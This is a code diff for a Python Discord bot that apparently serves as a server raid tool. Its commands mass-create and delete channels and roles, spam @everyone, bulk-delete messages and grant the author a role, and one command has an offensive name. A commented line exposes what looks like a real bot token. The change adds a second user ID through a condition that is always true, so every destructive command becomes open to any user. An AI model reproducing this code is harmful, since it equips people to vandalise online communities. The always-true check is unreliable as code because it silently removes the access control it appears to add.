@@ -7,6 +7,7 @@ import os
 #token = "MTE1NDM1MDIzNzQyMzUyMTg4Mg.Gd77BH.3ayxpbs_OkG_WddxyAy3Qb7rMwpiLI22K80W6I"
 token = os.getenv('DISCORD_BOT_TOKEN')
 owner_id = 946386383809949756
+uuqq_id = 424954210866692099
 imintomen_id = 1142107446458978344
 
 # Define the necessary intents
@@ -18,7 +19,7 @@ bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None
 
 @bot.command()
 async def create(ctx, channel_name: str, amount: int):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         await ctx.message.delete()
         allow_mentions = discord.AllowedMentions(everyone=True)
         guild = ctx.message.guild
@@ -37,7 +38,7 @@ async def create(ctx, channel_name: str, amount: int):
 
 @bot.command()
 async def remove(ctx, prefix: str):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         await ctx.message.delete()
         # Get all channels that start with the given prefix
         existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
@@ -55,7 +56,7 @@ async def remove(ctx, prefix: str):
 
 @bot.command()
 async def mass(ctx, *, message: str):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         await ctx.message.delete()
         allow_mentions = discord.AllowedMentions(everyone=True)  # Allow @everyone mention
         guild = ctx.guild
@@ -79,7 +80,7 @@ async def mass(ctx, *, message: str):
 
 @bot.command()
 async def addrole(ctx, role_name: str, role_amount : int):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         await ctx.message.delete()
         guild = ctx.guild
         async def create_role():
@@ -93,7 +94,7 @@ async def addrole(ctx, role_name: str, role_amount : int):
 
 @bot.command()
 async def delrole(ctx):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         await ctx.message.delete()
         bot_role = ctx.guild.me.top_role  # Get the bot's highest role
         # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
@@ -118,7 +119,7 @@ async def delrole(ctx):
 
 @bot.command()
 async def ascend(ctx):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         role_name = "Doryan"
         role = discord.utils.get(ctx.guild.roles, name=role_name)
         
@@ -147,7 +148,7 @@ async def create_invite(ctx):
 
 @bot.command()
 async def unban(ctx):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         target_guild = bot.get_guild(imintomen_id)
         if target_guild is None:
             await ctx.send(f"Bot is not in the server with ID {imintomen_id}.")
@@ -188,7 +189,7 @@ import asyncio
 
 @bot.command()
 async def clear_mass(ctx, content: str):
-    if ctx.author.id == owner_id:
+    if ctx.author.id == owner_id or uuqq_id:
         deleted_count = 0  # Initialize the deleted_count here
 
         # Iterate through all the text channels in the guild where the command was issued
@@ -248,7 +249,7 @@ async def rape(ctx, user: discord.User):
 
 @bot.command()
 async def spam(ctx, message: str, amount: int):
-    if amount > 25 and ctx.author.id != owner_id:
+    if amount > 25 and ctx.author.id != owner_id or uuqq_id:
         await ctx.send("Maximum amount of 25 messages for Mortals.")
         return
 
